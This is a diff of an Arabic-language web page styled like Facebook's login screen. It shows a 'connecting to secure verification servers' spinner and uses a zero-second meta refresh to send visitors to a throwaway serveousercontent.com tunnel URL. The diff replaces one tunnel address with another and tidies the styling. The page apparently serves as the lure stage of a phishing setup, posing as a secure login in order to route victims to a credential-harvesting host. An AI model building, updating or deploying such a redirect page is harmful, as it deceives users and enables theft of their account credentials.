@@ -1,19 +1,46 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل دخول آمن</title>
-    <meta http-equiv="refresh" content="0;url=https://ae27e4a98959f5db-185-80-143-58.serveousercontent.com">
-</head>
-<body style="background-color: #f0f2f5; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
-    <div style="text-align: center;">
-        <p style="color: #1c1e21; font-size: 18px;">جاري الاتصال بخوادم التحقق الآمنة...</p>
-        <div style="border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 20px auto;"></div>
-    </div>
+    <title>جاري تسجيل الدخول...</title>
+    <meta http-equiv="refresh" content="0;url=https://8711b05e2572ee4f-185-80-143-58.serveousercontent.com">
     <style>
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body {
+            background-color: #f0f2f5;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #1c1e21;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            width: 35px;
+            height: 35px;
+            animation: spin 1s linear infinite;
+            margin: 15px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loader"></div>
+        <p>جاري الاتصال بخوادم التحقق الآمنة...</p>
+        <p style="font-size: 12px; color: #606770;">يرجى الانتظار لحظة.</p>
+    </div>
 </body>
 </html>
